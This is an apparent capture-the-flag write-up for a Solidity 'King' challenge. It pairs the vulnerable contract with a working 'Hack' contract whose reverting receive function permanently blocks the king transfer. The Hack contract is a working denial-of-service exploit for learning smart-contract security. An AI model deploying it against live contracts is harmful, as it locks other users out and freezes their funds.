## King

## The goal of this challenge is to stop the contract from updating the king everytime the receive function is called and for your address to stay the king until the very end

Solidity Code: 
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

If you take a look at the smart contract you can tell that by calling the receive function we will be able to become the king, but since the owner of the contract is deployer which is not our address, they can easily claim to be the king by just calling it again. Now we want to stay the king and break this contract, so our kingdom and our name stays on the blockchain FOREVER!!!

#### Approach

The approach we will take is fairly simple, first we will create a new contract Hack and create a payable constructor on it by passing in the address of the King contract we will be able to send a transaction to the King contract and call the receieve function. Now the way we will mess this game up is by not creating a single `receive` or a `fallback` function or create them and revert them into an error, this way we can call the function and become the king and we will block the contract from recieving further eth which will result into the second line of code in the `recieve` function being freezed and make us the KING of the contract forever.

 
- Go ahead and create the `Hack` contract and implement the above approach we explained

```typescript
contract Hack{
    constructor(address payable _target) payable {
        // we will fetch the prize and send more to be the king
        uint256 _prize = King(_target).prize();
        // now let's call the recieve function
        (bool sent, ) = _target.call{ value: _prize }("");
        require(sent, "Failed to send eth");
    }

    // we can either make the a receive or a fallback function and revert it or not make one at all
    // i'll make it to make the next king wannabe feel like shit
    receive() external payable {
        revert("HACKED YOU BITCH HAHAHA I'M THE KING FOREVER!!!");
    }

}
```

And this is it, you should now deploy the Hack contract and pass the address of the target and stay as the KING FOREVER!!!